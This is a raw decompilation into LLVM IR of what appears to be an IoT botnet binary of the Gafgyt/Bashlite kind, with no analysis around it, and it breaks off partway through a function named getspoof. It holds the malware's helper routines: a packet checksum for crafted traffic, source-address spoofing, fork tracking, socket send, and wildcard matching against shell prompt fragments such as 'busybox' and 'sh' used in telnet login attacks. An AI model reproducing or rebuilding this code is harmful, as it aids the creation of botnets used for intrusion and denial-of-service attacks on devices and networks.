@global_var_806f848.766 = global i32 -1
@global_var_8060b57.767 = constant i32 -294069
@global_var_807d138.768 = local_unnamed_addr global i32 0
@global_var_807d13c.769 = local_unnamed_addr global i32 0
@global_var_806da60.770 = constant [10 x i8] c"/dev/null\00"
@global_var_807d12c.772 = local_unnamed_addr global i32 0
@global_var_8060d3d.774 = constant i32 1928542531
@global_var_8060d61.775 = constant i32 1928542531
@global_var_807d160.776 = global i32 0
@global_var_807d144.778 = global i32 0
@global_var_807ea2c.779 = global i32 0
@global_var_807ea40.780 = global i32 0
@global_var_807ea30.781 = global i32 0
@global_var_807e9a0.782 = global i32 0
@global_var_807d2a4.783 = local_unnamed_addr global i32 0
@global_var_806e090.785 = constant [4 x i8] c"inf\00"
@global_var_806e093.790 = constant i32 1179535616
@global_var_806e0a0.791 = constant i32 2883630
@global_var_806e198.793 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_807486c.794 = global i32 134620399
@global_var_807ea20.795 = global i32 0
@global_var_807d228.796 = global i32 0
@global_var_807d244.798 = global i32 0
@global_var_806e1e0.804 = constant i32 0
@global_var_806e1f8.805 = constant i32 134624917
@global_var_806e204.806 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_807d25c.807 = global i32 0
@global_var_806e25d.808 = constant i32 0
@global_var_806e228.809 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_806e243.810 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_806e280.811 = constant i32 134627328
@global_var_807d260.812 = local_unnamed_addr global i32 0
@global_var_8074884.813 = global i32 0
@global_var_807d264.814 = local_unnamed_addr global i32 0
@global_var_806e2f1.815 = constant i32 1868824690
@global_var_806e2a8.816 = constant [14 x i8] c"/etc/services\00"
@global_var_806e2b6.817 = constant [3 x i8] c"#\0A\00"
@global_var_806e2b9.818 = constant [3 x i8] c" \09\00"
@global_var_806e2bc.819 = constant [3 x i8] c",/\00"
@global_var_807d268.820 = global i32 0
@global_var_807ea64.825 = local_unnamed_addr global i32 0
@global_var_806d7c6.826 = constant i32 1885929518
@global_var_806e2bf.827 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_806e2d0.828 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_806e2e8.829 = constant [11 x i8] c"nameserver\00"
@global_var_806e2f3.830 = constant [7 x i8] c"domain\00"
@global_var_806e2fa.831 = constant [7 x i8] c"search\00"
@global_var_807ea44.832 = global i32 0
@global_var_807d298.833 = local_unnamed_addr global i32 0
@global_var_806576e.834 = constant i32 -1592736637
@global_var_807d29c.835 = local_unnamed_addr global i32 0
@global_var_807d2a0.836 = local_unnamed_addr global i32 0
@global_var_807ea68.837 = local_unnamed_addr global i32 0
@global_var_807ea6c.838 = local_unnamed_addr global i32 0
@global_var_806e304.839 = constant i32 134635652
@global_var_806e318.841 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_806e330.842 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_806e365.843 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_806e37c.848 = constant [24 x i8] c"Cannot register service\00"
@global_var_807d2ac.849 = local_unnamed_addr global i32 0
@global_var_806e3a4.850 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_806e3be.851 = constant [11 x i8] c"/etc/hosts\00"
@global_var_806e3c9.852 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_806e5e0.853 = constant i32 0
@global_var_806e5e4.854 = constant i32 0
@global_var_806e680.855 = constant [13 x i8] c"RPC: Success\00"
@global_var_806e3db.856 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_806e3f5.857 = constant [5 x i8] c"%s: \00"
@global_var_806e3fa.858 = constant [4 x i8] c" - \00"
@global_var_806e3fe.860 = constant [13 x i8] c"; errno = %s\00"
@global_var_806e4c4.861 = constant i32 0
@global_var_806e500.862 = constant [18 x i8] c"Authentication OK\00"
@global_var_806e4c0.863 = constant i32 0
@global_var_806e433.864 = constant [9 x i8] c"; why = \00"
@global_var_806e43c.865 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_806e40b.866 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_806e460.867 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_806f84c.868 = global i32 134580057
@global_var_80748c0.20 = local_unnamed_addr global i8 0
@global_var_8074900.27 = external global i8*
@global_var_80748e8.28 = local_unnamed_addr global i8 0
@global_var_80748ec.33 = external global i8*
@global_var_80748f0.34 = local_unnamed_addr global i64 0
@global_var_807d500.88 = local_unnamed_addr global i64 0
@2 = internal constant [5 x i8] c"\03\03\0D3\00"
@global_var_8069340.156 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @2, i32 0, i32 0)
@3 = internal constant [3 x i8] c"0\84\00"
@global_var_8069620.179 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @3, i32 0, i32 0)
@4 = internal constant [2 x i8] c"0\00"
@global_var_8069a6d.206 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @4, i32 0, i32 0)
@5 = internal constant [2 x i8] c"$\00"
@6 = internal constant [2 x i8] c">\00"
@7 = internal constant [4 x i8] c"ell\00"
@8 = internal constant [7 x i8] c"usybox\00"
@9 = internal constant [3 x i8] c"ox\00"
@10 = internal constant [4 x i8] c"ror\00"
@11 = internal constant [7 x i8] c"oodbye\00"
@12 = internal constant [3 x i8] c"ye\00"
@13 = internal constant [2 x i8] c"h\00"
@14 = internal constant [6 x i8] c"in/sh\00"
@global_var_8068816.304 = constant [10 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @6, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @9, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @13, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @14, i32 0, i32 0)]
@global_var_80748ef.596 = external local_unnamed_addr global i8*
@global_var_80748ee.597 = external local_unnamed_addr global i8*
@global_var_80748ed.598 = external global i8*
@global_var_806f8a0.599 = local_unnamed_addr global i64 578274809050300417
@global_var_8074300.672 = local_unnamed_addr global i8 0
@global_var_806cb9e.702 = external constant i8*
@15 = internal constant [3 x i8] c"\01\06\00"
@global_var_806d747.715 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @15, i32 0, i32 0)
@global_var_807e620.732 = global i8 0
@global_var_807e980.748 = local_unnamed_addr global i8 0
@global_var_807d120.753 = local_unnamed_addr global i8 0
@global_var_807d140.771 = local_unnamed_addr global i8 0
@global_var_807d240.797 = local_unnamed_addr global i8 0
@global_var_807d278.821 = local_unnamed_addr global i8 0
@global_var_807d27c.822 = external global i8*
@global_var_807d294.823 = local_unnamed_addr global i64 0
@global_var_807489c.824 = local_unnamed_addr global i16 1
@global_var_807d2a8.840 = local_unnamed_addr global i16 0
@global_var_8068ea3.83 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 161731
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80748c0.20, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_806f884.22 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_806f884.22 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_806f884.22 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80748c0.20, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_806f884.22 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80748c0.20, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_806e844.23 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_806f85c.25, align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134569271, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134640072, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8068845.26 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8048192 = load i32, i32* @ebp, align 4
  %v4_80481b727 = add i32 %arg2, -1
  %v9_80481b728 = sub i32 0, %arg2
  %v10_80481b729 = and i32 %arg2, %v9_80481b728
  %v11_80481b730 = icmp slt i32 %v10_80481b729, 0
  %v12_80481b731 = icmp eq i32 %v4_80481b727, 0
  %v13_80481b732 = icmp slt i32 %v4_80481b727, 0
  %v3_80481bb33 = icmp eq i1 %v13_80481b732, %v11_80481b730
  %v4_80481bb34 = icmp eq i1 %v12_80481b731, false
  %v5_80481bb35 = and i1 %v4_80481bb34, %v3_80481bb33
  br i1 %v5_80481bb35, label %dec_label_pc_80481a1, label %dec_label_pc_80481bd

dec_label_pc_80481a1:                             ; preds = %entry, %dec_label_pc_80481a1
  %stack_var_8.038 = phi i32 [ %v4_80481b3, %dec_label_pc_80481a1 ], [ %arg2, %entry ]
  %stack_var_4.037 = phi i16* [ %v23_80481af, %dec_label_pc_80481a1 ], [ %arg1, %entry ]
  %v3_80481ac36 = phi i16 [ %v6_80481ac, %dec_label_pc_80481a1 ], [ 0, %entry ]
  %v4_80481a1 = ptrtoint i16* %stack_var_4.037 to i32
  %v2_80481a4 = load i16, i16* %stack_var_4.037, align 2
  %v6_80481ac = add i16 %v2_80481a4, %v3_80481ac36
  %v5_80481af = add i32 %v4_80481a1, 2
  %v23_80481af = inttoptr i32 %v5_80481af to i16*
  %v4_80481b3 = add i32 %stack_var_8.038, -2
  %v4_80481b7 = add i32 %stack_var_8.038, -3
  %v9_80481b7 = sub i32 2, %stack_var_8.038
  %v10_80481b7 = and i32 %v4_80481b3, %v9_80481b7
  %v11_80481b7 = icmp slt i32 %v10_80481b7, 0
  %v12_80481b7 = icmp eq i32 %v4_80481b7, 0
  %v13_80481b7 = icmp slt i32 %v4_80481b7, 0
  %v3_80481bb = icmp eq i1 %v13_80481b7, %v11_80481b7
  %v4_80481bb = icmp eq i1 %v12_80481b7, false
  %v5_80481bb = and i1 %v4_80481bb, %v3_80481bb
  br i1 %v5_80481bb, label %dec_label_pc_80481a1, label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %dec_label_pc_80481a1, %entry
  %v3_80481ac.lcssa = phi i16 [ 0, %entry ], [ %v6_80481ac, %dec_label_pc_80481a1 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80481af, %dec_label_pc_80481a1 ]
  %v4_80481bb.lcssa = phi i1 [ %v4_80481bb34, %entry ], [ %v4_80481bb, %dec_label_pc_80481a1 ]
  br i1 %v4_80481bb.lcssa, label %dec_label_pc_80481df, label %dec_label_pc_80481c3

dec_label_pc_80481c3:                             ; preds = %dec_label_pc_80481bd
  %v4_80481cc = ptrtoint i16* %stack_var_4.0.lcssa to i32
  %v1_80481cf = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_80481cf = load i8, i8* %v1_80481cf, align 1
  %v3_80481cf = zext i8 %v2_80481cf to i32
  %v5_80481cf = and i32 %v4_80481cc, -256
  %v6_80481cf = or i32 %v3_80481cf, %v5_80481cf
  %v4_80481d315 = urem i32 %v6_80481cf, 65536
  %v4_80481dc47 = zext i16 %v3_80481ac.lcssa to i32
  %v6_80481dc = add nuw nsw i32 %v4_80481d315, %v4_80481dc47
  %v26_80481dc = trunc i32 %v6_80481dc to i16
  br label %dec_label_pc_80481df

dec_label_pc_80481df:                             ; preds = %dec_label_pc_80481bd, %dec_label_pc_80481c3
  %v3_80481e5 = phi i16 [ %v3_80481ac.lcssa, %dec_label_pc_80481bd ], [ %v26_80481dc, %dec_label_pc_80481c3 ]
  %v4_80481df = sext i16 %v3_80481e5 to i32
  %v2_80481e2 = sdiv i32 %v4_80481df, 65536
  %v2_80481e9 = add nsw i32 %v2_80481e2, %v4_80481df
  %sext3 = mul i32 %v2_80481e9, 65536
  %v2_80481f1 = ashr i32 %sext3, 31
  %v6_80481f41719 = add nsw i32 %v2_80481f1, %v2_80481e9
  %v4_80481f41618 = mul i32 %v6_80481f41719, 65536
  %v4_80481f726 = udiv i32 %v4_80481f41618, 65536
  %v1_80481fc = xor i32 %v4_80481f726, 65535
  store i32 %v0_8048192, i32* @ebp, align 4
  ret i32 %v1_80481fc

; uselistorder directives
  uselistorder i32 %v2_80481e9, { 1, 0 }
  uselistorder i32 %v4_80481df, { 1, 0 }
  uselistorder i16 %v3_80481ac.lcssa, { 1, 0 }
  uselistorder i32 %v4_80481b7, { 1, 0 }
  uselistorder i32 %v4_80481b3, { 1, 0 }
  uselistorder label %dec_label_pc_80481df, { 1, 0 }
  uselistorder label %dec_label_pc_80481a1, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048206 = load i32, i32* @ebx, align 4
  store i32 %v0_8048206, i32* %stack_var_-8, align 4
  %v4_804820a = ptrtoint i8* %arg1 to i32
  %v2_804820d = load i8, i8* %arg1, align 1
  %v12_8048215 = icmp eq i8 %v2_804820d, 42
  br i1 %v12_8048215, label %dec_label_pc_804823c, label %dec_label_pc_804821b

dec_label_pc_804821b:                             ; preds = %entry
  %v12_804821b = icmp eq i8 %v2_804820d, 63
  br i1 %v12_804821b, label %dec_label_pc_804828e, label %dec_label_pc_8048221

dec_label_pc_8048221:                             ; preds = %dec_label_pc_804821b
  %v4_8048221 = icmp eq i8 %v2_804820d, 0
  br i1 %v4_8048221, label %dec_label_pc_804822c, label %dec_label_pc_80482c8

dec_label_pc_804822c:                             ; preds = %dec_label_pc_8048221
  %v2_804822f = load i8, i8* %tmp13, align 1
  %v2_8048231 = sext i8 %v2_804822f to i32
  br label %dec_label_pc_8048325

dec_label_pc_804823c:                             ; preds = %entry
  %v1_804823f = add i32 %v4_804820a, 1
  %v5_8048246 = inttoptr i32 %v1_804823f to i8*
  %v5_8048247 = call i32 @strwildmatch(i8* %v5_8048246, i32 %arg2)
  %v1_804824f = icmp eq i32 %v5_8048247, 0
  br i1 %v1_804824f, label %dec_label_pc_804827c, label %dec_label_pc_8048253

dec_label_pc_8048253:                             ; preds = %dec_label_pc_804823c
  %v2_8048256 = load i8, i8* %tmp13, align 1
  %v4_8048258 = icmp eq i8 %v2_8048256, 0
  br i1 %v4_8048258, label %dec_label_pc_8048283, label %dec_label_pc_804825c

dec_label_pc_804825c:                             ; preds = %dec_label_pc_8048253
  %v1_804825f = add i32 %arg2, 1
  %v5_8048267 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_804825f)
  %v1_804826f = icmp eq i32 %v5_8048267, 0
  br i1 %v1_804826f, label %dec_label_pc_804827c, label %dec_label_pc_8048283

dec_label_pc_804827c:                             ; preds = %dec_label_pc_804825c, %dec_label_pc_804823c
  br label %dec_label_pc_8048283

dec_label_pc_8048283:                             ; preds = %dec_label_pc_8048253, %dec_label_pc_804825c, %dec_label_pc_804827c
  %storemerge7 = phi i32 [ 0, %dec_label_pc_804827c ], [ 1, %dec_label_pc_804825c ], [ 1, %dec_label_pc_8048253 ]
  br label %dec_label_pc_8048325

dec_label_pc_804828e:                             ; preds = %dec_label_pc_804821b
  %v2_8048291 = load i8, i8* %tmp13, align 1
  %v4_8048293 = icmp eq i8 %v2_8048291, 0
  br i1 %v4_8048293, label %dec_label_pc_80482c0, label %dec_label_pc_8048297

dec_label_pc_8048297:                             ; preds = %dec_label_pc_804828e
  %v1_804829a = add i32 %arg2, 1
  %v1_804829e = add i32 %v4_804820a, 1
  %v5_80482a3 = inttoptr i32 %v1_804829e to i8*
  %v5_80482a4 = call i32 @strwildmatch(i8* %v5_80482a3, i32 %v1_804829a)
  %v1_80482ac = icmp ne i32 %v5_80482a4, 0
  %. = zext i1 %v1_80482ac to i32
  br label %dec_label_pc_80482c0

dec_label_pc_80482c0:                             ; preds = %dec_label_pc_8048297, %dec_label_pc_804828e
  %storemerge4 = phi i32 [ 1, %dec_label_pc_804828e ], [ %., %dec_label_pc_8048297 ]
  br label %dec_label_pc_8048325

dec_label_pc_80482c8:                             ; preds = %dec_label_pc_8048221
  %v2_80482cb = load i8, i8* %arg1, align 1
  %v2_80482cd = sext i8 %v2_80482cb to i32
  %v2_80482d4 = call i32 @__GI_toupper(i32 %v2_80482cd)
  store i32 %v2_80482d4, i32* @ebx, align 4
  %v2_80482e1 = load i8, i8* %tmp13, align 1
  %v2_80482e3 = sext i8 %v2_80482e1 to i32
  %v2_80482ea = call i32 @__GI_toupper(i32 %v2_80482e3)
  %v0_80482f2 = load i32, i32* @ebx, align 4
  %v12_80482f2 = icmp eq i32 %v0_80482f2, %v2_80482ea
  %v1_80482f4 = icmp eq i1 %v12_80482f2, false
  br i1 %v1_80482f4, label %dec_label_pc_804831f, label %dec_label_pc_80482f6

dec_label_pc_80482f6:                             ; preds = %dec_label_pc_80482c8
  %v1_80482f9 = add i32 %arg2, 1
  %v1_80482fd = add i32 %v4_804820a, 1
  %v5_8048302 = inttoptr i32 %v1_80482fd to i8*
  %v5_8048303 = call i32 @strwildmatch(i8* %v5_8048302, i32 %v1_80482f9)
  %v1_804830b = icmp ne i32 %v5_8048303, 0
  %.8 = zext i1 %v1_804830b to i32
  br label %dec_label_pc_804831f

dec_label_pc_804831f:                             ; preds = %dec_label_pc_80482f6, %dec_label_pc_80482c8
  %storemerge = phi i32 [ 1, %dec_label_pc_80482c8 ], [ %.8, %dec_label_pc_80482f6 ]
  br label %dec_label_pc_8048325

dec_label_pc_8048325:                             ; preds = %dec_label_pc_80482c0, %dec_label_pc_8048283, %dec_label_pc_804822c, %dec_label_pc_804831f
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_8048283 ], [ %storemerge4, %dec_label_pc_80482c0 ], [ %v2_8048231, %dec_label_pc_804822c ], [ %storemerge, %dec_label_pc_804831f ]
  %v3_8048328 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048328, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_804820d, { 2, 0, 1 }
  uselistorder i32 %v4_804820a, { 0, 2, 1 }
  uselistorder i8* %tmp13, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048325, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048283, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v0_8048330 = load i32, i32* @edi, align 4
  %v4_8048337 = ptrtoint i32* %stack_var_12 to i32
  %v5_8048349 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8074900.27 to i32), i32 %arg2, i32 %v4_8048337)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8074900.27 to i32), i32* @edi, align 4
  %v3_8048364 = call i32 @_strlen(i8* bitcast (i8** @global_var_8074900.27 to i8*))
  %v4_8048364 = mul i32 %v3_8048364, -1
  %v5_8048364 = add i32 %v4_8048364, -2
  store i32 %v5_8048364, i32* @ecx, align 4
  %v1_804836a = sub i32 0, %v4_8048364
  %v5_8048377 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8074900.27 to i32), i32 %v1_804836a)
  store i32 %v0_8048330, i32* @edi, align 4
  ret i32 %v5_8048377
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_804838a = load i8, i8* @global_var_80748e8.28, align 8
  %v10_804838f = icmp eq i8 %v0_804838a, 1
  %v1_8048391 = icmp eq i1 %v10_804838f, false
  br i1 %v1_8048391, label %dec_label_pc_80483b8, label %dec_label_pc_8048393

dec_label_pc_8048393:                             ; preds = %entry
  %v0_8048393 = load i32, i32* @global_var_807d3d0.29, align 16
  %v3_80483a4 = call i32 @Send(i32 %v0_8048393, i32 ptrtoint ([30 x i8]* @global_var_806884c.30 to i32))
  br label %dec_label_pc_804845e

dec_label_pc_80483b8:                             ; preds = %entry
  %v1_80483b8 = call i32 @fork(i32 %tmp4)
  %v4_80483c0 = icmp eq i32 %v1_80483b8, 0
  %v1_80483c4 = icmp eq i1 %v4_80483c0, false
  br i1 %v1_80483c4, label %dec_label_pc_80483d1, label %dec_label_pc_80483c6

dec_label_pc_80483c6:                             ; preds = %dec_label_pc_80483b8
  br label %dec_label_pc_804845e

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483b8
  %v0_80483d1 = load i32, i32* @global_var_80748f4.31, align 4
  %v1_80483d6 = add i32 %v0_80483d1, 1
  store i32 %v1_80483d6, i32* @global_var_80748f4.31, align 4
  %v2_80483e1 = mul i32 %v1_80483d6, 4
  %v1_80483e4 = add i32 %v2_80483e1, 4
  %v1_80483eb = call i32 @malloc(i32 %v1_80483e4)
  %v0_804842113 = load i32, i32* @global_var_80748f4.31, align 4
  %v6_804842a15 = icmp eq i32 %v0_804842113, 1
  br i1 %v6_804842a15, label %dec_label_pc_804842c, label %dec_label_pc_80483ff

dec_label_pc_80483ff:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483ff
  %storemerge16 = phi i32 [ %v4_804841e, %dec_label_pc_80483ff ], [ 0, %dec_label_pc_80483d1 ]
  %v2_8048402 = mul i32 %storemerge16, 4
  %v5_8048407 = add i32 %v2_8048402, %v1_80483eb
  store i32 %v5_8048407, i32* @ecx, align 4
  %v0_8048412 = load i32, i32* @global_var_807e574.32, align 4
  %v2_8048417 = add i32 %v0_8048412, %v2_8048402
  %v1_804841a = inttoptr i32 %v2_8048417 to i32*
  %v2_804841a = load i32, i32* %v1_804841a, align 4
  %v2_804841c = inttoptr i32 %v5_8048407 to i32*
  store i32 %v2_804841a, i32* %v2_804841c, align 4
  %v4_804841e = add i32 %storemerge16, 1
  %v0_8048421 = load i32, i32* @global_var_80748f4.31, align 4
  %v1_8048426 = add i32 %v0_8048421, -1
  %v6_804842a = icmp ugt i32 %v1_8048426, %v4_804841e
  br i1 %v6_804842a, label %dec_label_pc_80483ff, label %dec_label_pc_804842c

dec_label_pc_804842c:                             ; preds = %dec_label_pc_80483ff, %dec_label_pc_80483d1
  %v0_8048421.lcssa = phi i32 [ %v0_804842113, %dec_label_pc_80483d1 ], [ %v0_8048421, %dec_label_pc_80483ff ]
  %v2_8048431 = mul i32 %v0_8048421.lcssa, 4
  %v5_8048434 = add i32 %v1_80483eb, -4
  %v1_8048437 = add i32 %v5_8048434, %v2_8048431
  store i32 %v1_8048437, i32* @edx, align 4
  %v2_804843d = inttoptr i32 %v1_8048437 to i32*
  store i32 %v1_80483b8, i32* %v2_804843d, align 4
  %v0_804843f = load i32, i32* @global_var_807e574.32, align 4
  %v1_8048448 = call i32 @free(i32 %v0_804843f)
  store i32 %v1_80483eb, i32* @global_var_807e574.32, align 4
  br label %dec_label_pc_804845e

dec_label_pc_804845e:                             ; preds = %dec_label_pc_80483c6, %dec_label_pc_8048393, %dec_label_pc_804842c
  %stack_var_-24.0 = phi i32 [ %v1_80483b8, %dec_label_pc_804842c ], [ %v1_80483b8, %dec_label_pc_80483c6 ], [ 1, %dec_label_pc_8048393 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_804841e, { 1, 0 }
  uselistorder i32 %v2_8048402, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v0_804842113, { 1, 0 }
  uselistorder i32 %v1_80483eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804845e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80483ff, { 1, 0 }
}

define i32 @getspoof(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048469 = load i8*, i8** @global_var_80748ec.33, align 4
  %v1_8048469 = ptrtoint i8* %v0_8048469 to i32
  %v2_804846e = icmp eq i8* %v0_8048469, null
  %v1_8048470 = icmp eq i1 %v2_804846e, false
  br i1 %v1_8048470, label %dec_label_pc_804847c, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %entry
